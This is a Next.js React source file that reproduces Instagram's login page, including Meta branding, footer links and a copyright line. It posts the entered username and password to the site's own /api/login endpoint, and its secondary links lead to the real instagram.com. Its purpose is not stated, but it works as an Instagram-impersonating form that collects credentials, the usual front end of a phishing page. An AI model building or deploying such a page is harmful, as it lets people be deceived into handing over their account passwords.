// app/page.tsx
"use client";

import Image from "next/image";
import { useState } from "react";

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      const data = await response.json();
      if (response.ok) {
        setMessage("Login berhasil!");
        setUsername("");
        setPassword("");
      } else {
        setMessage(data.error || "Terjadi kesalahan.");
      }
    } catch (error) {
      console.log(error);

      setMessage("Gagal menghubungi server.");
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50 font-roboto-flex">
      <div className="flex items-center gap-6 mt-16 mb-8">
        <Image alt="instagram" width={480 / 1.2} height={0} src={"/ig.png"} />
        <div className="flex flex-col items-center gap-4">
          <div className="flex flex-col border-gray-300 border items-center w-96 p-12 bg-white  gap-4">
            <Image
              alt="logo instagram"
              width={180}
              height={0}
              src="/logos_instagram.svg"
            />
            <form onSubmit={handleSubmit} className="space-y-4 w-full">
              <div className="flex flex-col gap-2">
                <div>
                  <input
                    type="text"
                    id="username"
                    placeholder="Phone number, username, or email"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                    className="w-full px-3 py-2 border border-gray-300 rounded placeholder:font-roboto-flex placeholder:text-xs focus:outline-none focus:border-gray-500 placeholder:text-gray-500"
                  />
                </div>

                <div>
                  <input
                    type="password"
                    id="password"
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className="w-full px-3 py-2 border border-gray-300 rounded placeholder:font-roboto-flex placeholder:text-xs focus:outline-none focus:border-gray-500 placeholder:text-gray-500"
                  />
                </div>
              </div>

              <button
                type="submit"
                className="w-full font-roboto-flex text-sm py-2 bg-[#4BB4F8] text-white font-medium rounded-lg mt-4 hover:bg-[#4BB4F8]"
              >
                Log in
              </button>
            </form>

            {message && (
              <p className="mt-4 text-center text-sm text-red-500">{message}</p>
            )}

            <div className="flex flex-col w-full">
              <div className="flex items-center mt-6 w-full">
                <div className="flex-grow border-t border-gray-300"></div>
                <span className="px-4 text-gray-500 text-xs font-semibold">
                  OR
                </span>
                <div className="flex-grow border-t border-gray-300"></div>
              </div>
              <div className="flex mt-4 gap-2 items-center justify-center">
                <Image src={"/fb.svg"} alt="fb" width={18} height={0} />
                <a
                  href="https://www.instagram.com/accounts/emailsignup/s"
                  className="mt-0.5 text-sm text-center text-[#385195] font-medium"
                >
                  Log in with Facebook?
                </a>
              </div>
              <a
                href="https://www.instagram.com/accounts/emailsignup/s"
                className="mt-4 text-sm text-center text-gray-500"
              >
                Forgot password?
              </a>
            </div>
          </div>
          <div className="flex flex-col border-gray-300 border items-center w-96 px-12 py-6 bg-white rounded-lg gap-4">
            <div className="text-sm text-center">
              <p className="font-roboto-flex">
                {`Don't have an account? `}
                <a
                  href="https://www.instagram.com/accounts/emailsignup/"
                  className="text-blue-500 font-semibold"
                >
                  Sign up
                </a>
              </p>
            </div>
          </div>
          <div className="flex flex-col items-center gap-4">
            <div>Get the app.</div>
            <div className="flex gap-2">
              <Image
                alt="google-play"
                src={"/googleplay.png"}
                width={180 / 1.5}
                height={0}
              />
              <Image
                alt="microsoft"
                src={"/microsoft.png"}
                width={148 / 1.5}
                height={0}
              />
            </div>
          </div>
        </div>
      </div>

      <footer className="flex flex-col font-extralight font-roboto-flex items-center text-gray-500 text-[13px]">
        <div className="flex gap-4 mb-4 flex-wrap justify-center">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
          <a href="#">Meta in Indonesia</a>
        </div>
        <div className="text-center flex items-center justify-center gap-2 mb-4">
          <select className="bg-transparent text-gray-500">
            <option>English</option>
            <option>Indonesia</option>
            {/* Tambahkan bahasa lain sesuai kebutuhan */}
          </select>
          &copy; 2024 Instagram from Meta
        </div>
      </footer>
    </div>
  );
}
